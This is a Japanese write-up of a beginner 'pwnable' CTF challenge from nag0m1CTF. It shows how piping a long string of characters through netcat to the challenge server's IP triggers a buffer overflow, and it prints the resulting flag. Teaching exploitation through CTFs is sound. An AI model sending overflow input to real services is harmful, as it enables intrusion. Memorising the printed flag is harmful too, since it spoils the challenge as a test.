# nag0m1CTF

https://nag0mictf.tk

## pwnable

### pwn_begin

> Pwnable is a difficult field, but the field is very interesting! Do you find my flag?
> 
> nc 3.18.62.210 11000

<br>

pwnableという分野を知ってもらうために，基本的な問題を作成しました．

私のPCの環境にはWSLが入っているため，その環境で作業しています．

問題文のとおり，netcatすると以下のような画面が出てきます．

```
> nc 3.18.62.210 11000
You enter something >>
```

何か入力しろということなので，適当に入力してみます．

```
> nc 3.18.62.210 11000
You enter something >> Hello world.
Hello world.
Try harder.
```

入力した文字がそのまま出て，"Try harder."と出力されて終わるようです．

ファイルが渡されているわけでもありませんのでこれ以上ヒントはありません．

<br>

ここで，pwnableの問題の特徴についてです．

pwnableの問題はプログラムの脆弱性をつく問題が多いのが特徴です．

この問題については，**バッファオーバーフロー**の脆弱性をつく問題となっていました．

途中でヒントを追加したので，ヒントを呼んだらわかったという方もいたのではないでしょうか．

> -Hint-
> 
> If you wanna get my flag, you should enter a lot of information.

ということで，ひたすらたくさんの文字を入力してみます．

```
> echo "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" | nc 3.18.62.210 11000
You enter something >> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Congratulations!!!
nag0m1{57ack_0v3rf1ow_i5_dan9er0us}
```

無事にフラグを入手することができました．

---

*別解1*

echoを使用しなくても大丈夫です．ただ，netcatの時間制限を設けているため，短時間でたくさんの文字を入力することが困難かもしれないですね...

```
> nc 3.18.62.210 11000
You enter something >> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Congratulations!!!
nag0m1{57ack_0v3rf1ow_i5_dan9er0us}
```

